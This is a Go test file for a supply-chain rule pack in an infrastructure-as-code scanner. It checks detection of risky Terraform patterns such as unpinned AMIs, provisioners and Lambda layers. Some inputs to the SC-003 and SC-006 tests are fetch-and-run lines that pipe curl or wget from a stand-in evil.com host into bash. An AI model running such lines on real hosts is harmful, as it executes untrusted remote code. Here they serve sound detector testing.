package supplychain

import (
	"testing"

	"aegis/internal/ir"
)

// scRes builds a generic resource for supply-chain rule tests.
func scRes(resType, name string, attrs map[string]ir.Value) ir.Resource {
	return ir.Resource{
		Type: resType, Name: name, Provider: "test",
		Attributes: attrs,
		Span:       ir.Span{File: "t.tf", StartLine: 1},
	}
}

func strVal(s string) ir.Value {
	return ir.Value{Raw: s, Known: true, Span: ir.Span{File: "t.tf", StartLine: 2}}
}

func unknownVal() ir.Value {
	return ir.UnknownValue(ir.Span{File: "t.tf", StartLine: 2})
}

// runSingleRule runs one rule's Check across resources (single-resource rules).
func runSingleRule(t *testing.T, rule ir.Rule, resources []ir.Resource) []ir.Finding {
	t.Helper()
	var out []ir.Finding
	for _, r := range resources {
		if !rule.AppliesTo(r.Type) {
			continue
		}
		out = append(out, rule.Check(r)...)
	}
	return out
}

func expectFindings(t *testing.T, rule ir.Rule, resources []ir.Resource, want int, ruleID string) []ir.Finding {
	t.Helper()
	fs := runSingleRule(t, rule, resources)
	if len(fs) != want {
		t.Fatalf("%s: got %d findings, want %d: %+v", ruleID, len(fs), want, fs)
	}
	for _, f := range fs {
		if f.RuleID != ruleID {
			t.Errorf("%s: finding has rule ID %q", ruleID, f.RuleID)
		}
		if f.Evidence.Attribute == "" || f.Evidence.Span.File == "" {
			t.Errorf("%s: finding missing evidence attribute/span: %+v", ruleID, f)
		}
	}
	return fs
}

// ---------------------------------------------------------------------------
// SC-002: Lambda public ECR image
// ---------------------------------------------------------------------------

func TestSC002_PublicECRFires(t *testing.T) {
	r := scRes("aws_lambda_function", "f", map[string]ir.Value{
		"image_uri": strVal("public.ecr.aws/lambda/python:3.11"),
	})
	expectFindings(t, lambdaPublicECRImage{}, []ir.Resource{r}, 1, "AEGIS-SC-002")
}

func TestSC002_PrivateECRSilent(t *testing.T) {
	r := scRes("aws_lambda_function", "f", map[string]ir.Value{
		"image_uri": strVal("123456789012.dkr.ecr.us-east-1.amazonaws.com/myimg:v1"),
	})
	expectFindings(t, lambdaPublicECRImage{}, []ir.Resource{r}, 0, "AEGIS-SC-002")
}

func TestSC002_UnknownSilent(t *testing.T) {
	r := scRes("aws_lambda_function", "f", map[string]ir.Value{
		"image_uri": unknownVal(),
	})
	expectFindings(t, lambdaPublicECRImage{}, []ir.Resource{r}, 0, "AEGIS-SC-002")
	// absent image_uri
	r2 := scRes("aws_lambda_function", "f", map[string]ir.Value{})
	expectFindings(t, lambdaPublicECRImage{}, []ir.Resource{r2}, 0, "AEGIS-SC-002")
}

// ---------------------------------------------------------------------------
// SC-003: user_data curl|bash
// ---------------------------------------------------------------------------

func TestSC003_CurlPipeFires(t *testing.T) {
	for _, ud := range []string{
		"curl -fsSL https://example.com/install.sh | bash",
		"wget -qO- http://evil.com/x.sh | sh",
		"#!/bin/bash\ncurl https://x.io/a.sh | sudo bash",
	} {
		r := scRes("aws_instance", "web", map[string]ir.Value{"user_data": strVal(ud)})
		expectFindings(t, userDataCurlPipe{}, []ir.Resource{r}, 1, "AEGIS-SC-003")
	}
}

func TestSC003_SafeSilent(t *testing.T) {
	for _, ud := range []string{
		"#!/bin/bash\necho hello",
		"curl -fsSL https://example.com/install.sh -o /tmp/i.sh",
		"wget https://example.com/file.tar.gz",
	} {
		r := scRes("aws_instance", "web", map[string]ir.Value{"user_data": strVal(ud)})
		expectFindings(t, userDataCurlPipe{}, []ir.Resource{r}, 0, "AEGIS-SC-003")
	}
}

func TestSC003_UnknownSilent(t *testing.T) {
	r := scRes("aws_instance", "web", map[string]ir.Value{"user_data": unknownVal()})
	expectFindings(t, userDataCurlPipe{}, []ir.Resource{r}, 0, "AEGIS-SC-003")
}

// ---------------------------------------------------------------------------
// SC-004: unpinned AMI
// ---------------------------------------------------------------------------

func TestSC004_LatestFires(t *testing.T) {
	r := scRes("aws_instance", "web", map[string]ir.Value{
		"ami": strVal("ubuntu-22.04-latest"),
	})
	expectFindings(t, unpinnedAMI{}, []ir.Resource{r}, 1, "AEGIS-SC-004")
}

func TestSC004_PinnedSilent(t *testing.T) {
	r := scRes("aws_instance", "web", map[string]ir.Value{
		"ami": strVal("ami-0abcdef1234567890"),
	})
	expectFindings(t, unpinnedAMI{}, []ir.Resource{r}, 0, "AEGIS-SC-004")
}

func TestSC004_UnknownSilent(t *testing.T) {
	r := scRes("aws_instance", "web", map[string]ir.Value{
		"ami": ir.Value{Ref: "var.ami", Known: false, Span: ir.Span{File: "t.tf"}},
	})
	expectFindings(t, unpinnedAMI{}, []ir.Resource{r}, 0, "AEGIS-SC-004")
}

// ---------------------------------------------------------------------------
// SC-005: remote-exec provisioner
// ---------------------------------------------------------------------------

func provBlock(attrs map[string]ir.Value) ir.Value {
	return ir.Value{
		Raw:   []ir.Value{{Raw: attrs, Known: true, Span: ir.Span{File: "t.tf"}}},
		Known: true, Span: ir.Span{File: "t.tf"},
	}
}

func TestSC005_RemoteExecFires(t *testing.T) {
	r := scRes("aws_instance", "web", map[string]ir.Value{
		"provisioner": provBlock(map[string]ir.Value{
			"inline": ir.Value{Raw: []ir.Value{strVal("echo hi")}, Known: true},
		}),
	})
	expectFindings(t, remoteExecProvisioner{}, []ir.Resource{r}, 1, "AEGIS-SC-005")
}

func TestSC005_LocalExecSilent(t *testing.T) {
	// local-exec uses 'command', not 'inline' — not this rule's concern
	r := scRes("aws_instance", "web", map[string]ir.Value{
		"provisioner": provBlock(map[string]ir.Value{
			"command": strVal("echo hi"),
		}),
	})
	expectFindings(t, remoteExecProvisioner{}, []ir.Resource{r}, 0, "AEGIS-SC-005")
}

func TestSC005_NoProvisionerSilent(t *testing.T) {
	r := scRes("aws_instance", "web", map[string]ir.Value{})
	expectFindings(t, remoteExecProvisioner{}, []ir.Resource{r}, 0, "AEGIS-SC-005")
}

// ---------------------------------------------------------------------------
// SC-006: null_resource with local-exec
// ---------------------------------------------------------------------------

func TestSC006_LocalExecFires(t *testing.T) {
	r := scRes("null_resource", "evil", map[string]ir.Value{
		"provisioner": provBlock(map[string]ir.Value{
			"command": strVal("curl evil.com | bash"),
		}),
	})
	fs := expectFindings(t, nullResourceLocalExec{}, []ir.Resource{r}, 1, "AEGIS-SC-006")
	if fs[0].Severity != ir.SeverityHigh {
		t.Errorf("severity = %q, want high", fs[0].Severity)
	}
}

func TestSC006_NoProvisionerSilent(t *testing.T) {
	r := scRes("null_resource", "ok", map[string]ir.Value{})
	expectFindings(t, nullResourceLocalExec{}, []ir.Resource{r}, 0, "AEGIS-SC-006")
}

func TestSC006_WrongTypeSilent(t *testing.T) {
	// local-exec on a non-null resource is not SC-006's concern
	r := scRes("aws_instance", "web", map[string]ir.Value{
		"provisioner": provBlock(map[string]ir.Value{
			"command": strVal("echo hi"),
		}),
	})
	expectFindings(t, nullResourceLocalExec{}, []ir.Resource{r}, 0, "AEGIS-SC-006")
}

// ---------------------------------------------------------------------------
// SC-007: external data source
// ---------------------------------------------------------------------------

func TestSC007_ExternalFires(t *testing.T) {
	r := scRes("terraform_data", "external.creds", map[string]ir.Value{
		"program": ir.Value{Raw: []ir.Value{strVal("python3")}, Known: true},
	})
	expectFindings(t, externalDataSource{}, []ir.Resource{r}, 1, "AEGIS-SC-007")
}

func TestSC007_NonExternalSilent(t *testing.T) {
	r := scRes("terraform_data", "aws_ami.ubuntu", map[string]ir.Value{})
	expectFindings(t, externalDataSource{}, []ir.Resource{r}, 0, "AEGIS-SC-007")
}

// ---------------------------------------------------------------------------
// SC-008: HTTP download in user_data
// ---------------------------------------------------------------------------

func TestSC008_HTTPFires(t *testing.T) {
	r := scRes("aws_instance", "web", map[string]ir.Value{
		"user_data": strVal("#!/bin/bash\nwget http://example.com/install.sh"),
	})
	expectFindings(t, userDataHTTPDownload{}, []ir.Resource{r}, 1, "AEGIS-SC-008")
}

func TestSC008_HTTPSilent(t *testing.T) {
	r := scRes("aws_instance", "web", map[string]ir.Value{
		"user_data": strVal("#!/bin/bash\nwget https://example.com/install.sh"),
	})
	expectFindings(t, userDataHTTPDownload{}, []ir.Resource{r}, 0, "AEGIS-SC-008")
}

func TestSC008_UnknownSilent(t *testing.T) {
	r := scRes("aws_instance", "web", map[string]ir.Value{"user_data": unknownVal()})
	expectFindings(t, userDataHTTPDownload{}, []ir.Resource{r}, 0, "AEGIS-SC-008")
}

// ---------------------------------------------------------------------------
// SC-009: Lambda layer from unknown account
// ---------------------------------------------------------------------------

func TestSC009_UnknownAccountFires(t *testing.T) {
	r := scRes("aws_lambda_function", "f", map[string]ir.Value{
		"layers": ir.Value{
			Raw:   []ir.Value{strVal("arn:aws:lambda:us-east-1:123456789012:layer:mylib:1")},
			Known: true,
		},
	})
	expectFindings(t, lambdaLayerUnknownAccount{}, []ir.Resource{r}, 1, "AEGIS-SC-009")
}

func TestSC009_NoLayersSilent(t *testing.T) {
	r := scRes("aws_lambda_function", "f", map[string]ir.Value{})
	expectFindings(t, lambdaLayerUnknownAccount{}, []ir.Resource{r}, 0, "AEGIS-SC-009")
}

func TestSC009_UnknownSilent(t *testing.T) {
	r := scRes("aws_lambda_function", "f", map[string]ir.Value{
		"layers": unknownVal(),
	})
	expectFindings(t, lambdaLayerUnknownAccount{}, []ir.Resource{r}, 0, "AEGIS-SC-009")
}

func TestSC009_DedupesAccounts(t *testing.T) {
	r := scRes("aws_lambda_function", "f", map[string]ir.Value{
		"layers": ir.Value{
			Raw: []ir.Value{
				strVal("arn:aws:lambda:us-east-1:123456789012:layer:a:1"),
				strVal("arn:aws:lambda:us-east-1:123456789012:layer:b:2"),
			},
			Known: true,
		},
	})
	// same account twice -> one finding
	expectFindings(t, lambdaLayerUnknownAccount{}, []ir.Resource{r}, 1, "AEGIS-SC-009")
}

// ---------------------------------------------------------------------------
// Pack wiring
// ---------------------------------------------------------------------------

func TestSupplyChainPackHasNineRules(t *testing.T) {
	rs := Rules()
	if len(rs) != 9 {
		t.Fatalf("Rules() returned %d rules, want 9", len(rs))
	}
	want := []string{
		"AEGIS-SC-001", "AEGIS-SC-002", "AEGIS-SC-003", "AEGIS-SC-004",
		"AEGIS-SC-005", "AEGIS-SC-006", "AEGIS-SC-007", "AEGIS-SC-008",
		"AEGIS-SC-009",
	}
	for i, id := range want {
		if rs[i].ID() != id {
			t.Errorf("Rules()[%d].ID() = %q, want %q", i, rs[i].ID(), id)
		}
	}
}

func TestSupplyChainExtraRulesDeterministic(t *testing.T) {
	// SC-009 with layers in different orders must produce identical output.
	mk := func(layers ...string) ir.Resource {
		vals := make([]ir.Value, len(layers))
		for i, l := range layers {
			vals[i] = strVal(l)
		}
		return scRes("aws_lambda_function", "f", map[string]ir.Value{
			"layers": ir.Value{Raw: vals, Known: true},
		})
	}
	a := "arn:aws:lambda:us-east-1:111111111111:layer:a:1"
	b := "arn:aws:lambda:us-east-1:222222222222:layer:b:1"
	f1 := runSingleRule(t, lambdaLayerUnknownAccount{}, []ir.Resource{mk(a, b)})
	f2 := runSingleRule(t, lambdaLayerUnknownAccount{}, []ir.Resource{mk(b, a)})
	if len(f1) != 2 || len(f2) != 2 {
		t.Fatalf("got %d/%d findings, want 2/2", len(f1), len(f2))
	}
	for i := range f1 {
		if f1[i].Evidence.Actual != f2[i].Evidence.Actual {
			t.Errorf("non-deterministic: %+v vs %+v", f1[i], f2[i])
		}
	}
}
